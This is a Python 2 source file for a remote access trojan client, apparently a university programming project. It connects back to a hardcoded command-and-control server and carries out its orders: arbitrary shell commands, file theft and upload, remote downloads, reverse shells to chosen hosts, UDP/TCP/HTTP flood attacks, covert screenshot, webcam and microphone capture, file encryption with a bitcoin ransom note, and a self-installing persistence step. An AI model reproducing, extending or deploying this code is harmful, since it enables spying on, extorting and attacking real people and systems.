#pip install requests
#pip install pycrypto
#pip install scapy
#pip install pillow
#pip install numpy
#pip install pyaudio
#Install pyinstaller: https://github.com/pyinstaller/pyinstaller
#Install scapy: https://github.com/secdev/scapy
#Install wincap: https://www.winpcap.org/
import os
import sys
import time
import threading
import random
import subprocess
import thread
import requests

import base64
import urllib
import ssl

from socket import *
from threading import Thread
from threading import Timer

from modules import protocollo
from modules import dos
from modules import ransom
from modules import utils
from functional_programming import functional

from _win32 import platform
from _win32 import persistence

os.system ("cls")
print "##############################################################################"
print "#  Progetto di Advanced Computer Programming                                 #"
print "#  A cura di Salvatore Nitopi					                            #"
print "##############################################################################"


host = "192.168.220.1"#"172.16.46.1"#		Server Adrress
port = 5555							#		Server Port

debug = 1							#		0 Per disattivare print
retry_time = 5 						#		Tempo retry
c_pwd = "password_client"			#		Password Autenticazione Client

#############################################################################

connected = False
SHELL_TIMEOUT = 10

#############################################################################
# Istanza della pila flood

pflood = dos.Pila()

############################################################################################################

class Timeout(Exception):
    pass


def run(command, timeout=10):
    proc = subprocess.Popen(command, bufsize=0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    poll_seconds = .250
    deadline = time.time()+timeout
    while time.time() < deadline and proc.poll() == None:
        time.sleep(poll_seconds)

    if proc.poll() == None:
        if float(sys.version[:3]) >= 2.6:
            proc.terminate()
        raise Timeout()

    stdout, stderr = proc.communicate()
    return stdout, stderr, proc.returncode


############################################################################################################

def client ():

	global connected
	while 1:
		connected = False
		while 1:
			while (connected == False):
				try:
					time.sleep(retry_time)

					if debug == 1: print "\n[*] Provo: " + host + ":" + str(port)

					s=socket(AF_INET, SOCK_STREAM)
					s.settimeout(20)
					s.connect((host,port))
					protocollo.send (s, "<_CLIENT_>")
					protocollo.send (s, c_pwd )
					if debug == 1: print "[*] Connesso"
					connected = True
				except Exception, e:
					if debug == 1: print str(e); print "[!] Connessione Chiusa\n"
					s.close()

			try:
				try: c = protocollo.recv (s)
				except: break


				if c == None:
					if debug == 1: print "[!] Errore, Connessione Server Interrotta"; print "[!] Connessione Chiusa (Server non risponde)"
					s.close()
					break


				if c == "<_AREYOUALIVE_>":
					pass


				elif c.split()[0] == 'cd':
					cf = c [ len(c.split()[0]) + 1 : ]
					try: os.chdir( cf ); protocollo.send (s, " ")
					except Exception, e: protocollo.send (s, str(e))


				elif c == "<_GETPATH_>":
					try: protocollo.send (s, os.getcwd() + "$ ")
					except Exception, e: protocollo.send (s, str(e))


				elif c.split()[0] == 'cmd_get':
					try:
						cf = c [ len(c.split()[0]) + 1 : ]
						f = open(cf,'rb')
						l = f.read()
						protocollo.send (s, l)
						f.close()
						if debug == 1: print "[*] File scaricato"
					except Exception, e:
						try: protocollo.send (s, "<_ERROR_>")
						except: break


				elif c.split()[0] == 'cmd_put':
					try:
						cf = c [ len(c.split()[0]) + 1 : ]
						l = "<_AREYOUALIVE_>"
						while l == "<_AREYOUALIVE_>":
							l = protocollo.recv (s)

						f = open(cf,'wb')
						f.write(l)
						f.close()
						if debug == 1: print"[*] File Inviato"
					except Exception, e:
						try: protocollo.send (s, "<_ERROR_>")
						except: break


				elif c.split()[0] == 'cmd_download':
					try:
						u = c.split()[1]
						o = c.split()[2]
						utils.download_file (u, o)
						protocollo.send (s, "[*] Download Finito\n")
						if debug == 1: print "FILE DOWNLOADED"
					except:
						try: protocollo.send (s, "[!] URL non valido, usa: cmd_download <url> <outputfile>\n\n")
						except: break


				elif c.split()[0] == 'cmd_reverse_shell':
					try: 
						h = c.split()[1]
						p = c.split()[2]
						protocollo.send (s, "[*] Reverse Shell launched on: " + h + ":" + p + "\n")
						thread.start_new_thread ( platform.reverse_shell, (h, p,) )
						if debug == 1: print "Reverse_shell sent"
					except: 
						try: protocollo.send (s, "[!] Errore, usa:\ncmd_reverse_shell <host> <port>\n\n")
						except: break


############################################################################################################

				elif c.split()[0] == 'cmd_flood_add':
					try:
						ty = c.split()[1]
						v = c.split()[2]
						p = c.split()[3]
						thr = c.split()[4]
						tim = c.split()[5]

						node = None

						if ty == "udp":
							node = dos.UDP_Flood()

						elif ty == "tcp":
							node = dos.TCP_Flood()

						elif ty == "http":
							node = dos.HTTP_Flood()

						else:
							protocollo.send (s, "[!] Errore, il tipo di flood deve essere <udp> o <tcp> o <http>\n\n")

						if node != None:
							node.set(v, p, thr, tim)
							pflood.push (node)
							protocollo.send (s, "[*] Elemento correttamente aggiunto nella pila flood:\n\tType: " + ty + "\n\tHost:Port: " + v + ":" + p + "\n\tThread_n: " + thr + "\n\tTimeout: " + tim + "\n\n")
						
					except:
						try: protocollo.send (s, "[!] Errore, usa:\ncmd_udp_flood <udp/tcp/http> <host> <port> <n_thread> <timeout>\n\n")
						except: break



				elif c.split()[0] == 'cmd_flood_remove':
					try: 

						pflood.delete ()
						protocollo.send (s, "[*] Elementi correttamente rimossi nella pila flood.\n\n")

					except: 
						try: protocollo.send (s, "[!] Errore, impossibile rimuovere i flood.\n\n")
						except: break



				elif c.split()[0] == 'cmd_flood_start':
					try: 

						if pflood.isEmpty() == True:
							protocollo.send (s, "[!] Errore, pila flood vuota.\n\n")
						else:
							x = dos.Attack(pflood)
							x.att()
							protocollo.send (s, "[*] Attacco avviato...\n\n")

					except: 
						try: protocollo.send (s, "[!] Errore, impossibile avviare l'attacco.\n\n")
						except: break


############################################################################################################


				elif c.split()[0] == "cmd_screenshot":
					try:
						quality = int(c.split()[1])
						scr = platform.screenshot (quality)
						protocollo.send (s, scr)
						if debug == 1: print "Screenshot sent"
					except: 
						try: protocollo.send (s, "<_ERROR_>")
						except: break


				elif c.split()[0]  == "cmd_camera":
					try: 
						quality = int(c.split()[1])
						scr = platform.camera (quality)
						protocollo.send (s, scr)
						if debug == 1: print "Photo sent"
					except: 
						try: protocollo.send (s, "<_ERROR_>")
						except: break


				elif c.split()[0] == "cmd_mic":
					try:
						q = c.split()[1]
						d = c.split()[2]

						f = platform.audio_record (q,d)
						protocollo.send (s, f)

					except Exception, e:
						if debug == 1: print str(e) 
						try: protocollo.send (s, "[!] Errore, usa: cmd_mic <quality 1-3> <duration>\n\n")
						except: break


				elif c.split()[0] == "cmd_ransome":
					try:
						key = str(c.split()[1])
						path = "C:\\Users\\user\\Desktop\\test_ransome\\"
						status = ransom.ransom_files (key, path)
						protocollo.send (s, status)
						m = "TUTTI FILES SONO STATI CIFRATI !!\nPer decifrare i file e' necessario pagare 100 euro in bitcoin al seguente indirizzo:\n000000000000000000000"
						thread.start_new_thread ( platform.msgbox, (m,) )
						if debug == 1: print "Files cifrati"
					except: 
						try: protocollo.send (s, "<_ERROR_>")
						except: break


				elif c.split()[0] == "cmd_unransome":
					try:
						key = str(c.split()[1])
						path = "C:\\Users\\user\\Desktop\\test_ransome\\"
						status = ransom.unransom_files (key, path)
						protocollo.send (s, status)
						m = "Grazie per il pagamento, i tuoi files sono stati decifrati."
						thread.start_new_thread ( platform.msgbox, (m,) )
						if debug == 1: print "Files decifrati"
					except: 
						try: protocollo.send (s, "<_ERROR_>")
						except: break


				elif c.split()[0] == "cmd_msgbox":
					try:
						m = c [ len(c.split()[0]) + 1 : ]
						thread.start_new_thread ( platform.msgbox, (m,) )
						protocollo.send (s, "[*] Messaggio inviato con successo\n\n")
					except: 
						try: protocollo.send (s, "<_ERROR_>")
						except: break


				elif c.split()[0] == 'cmd_functional':
					try:
						t = c [ len(c.split()[0]) + 1 : ]
						f = functional.Functional()
						a = functional.read (t)
						protocollo.send (s, "[*] Occorrenze trovate nel file " + str(f.count(a, f.build_matching)) + "\n\n")
					except:
						try: protocollo.send (s, "<_ERROR_>")
						except: break


				else:
					try:
						
						out, err, cod = run (c, timeout=SHELL_TIMEOUT)
						
						if (err == ""):
							if (out != ""):
								protocollo.send (s, out)
							else:
								protocollo.send (s, "[*] Comando eseguito su client")
						else:
							protocollo.send (s, err)

					except Exception, e:
						try: protocollo.send (s, "[!] Shell Timeout o Errore\n\n")
						except: break

					
			except Exception, e:
				if debug == 1: print "[!] Errore Sconosciuto"; print "[!] Connessione Chiusa (Errore Sconosciuto)"
				if debug == 1: print str(e)
				s.close()



n = None
p = None
k = "<_RUN_>"

try:
	n = sys.argv[0]
	p = sys.argv[1]
except:
	pass

if p == k:			# Se viene lanciato dal run file
	client()

else:				# Se NON viene lanciato dal run file
	try:
		persistence.infect (n, k)
		sys.exit(0)
	except:
		sys.exit(0)
	

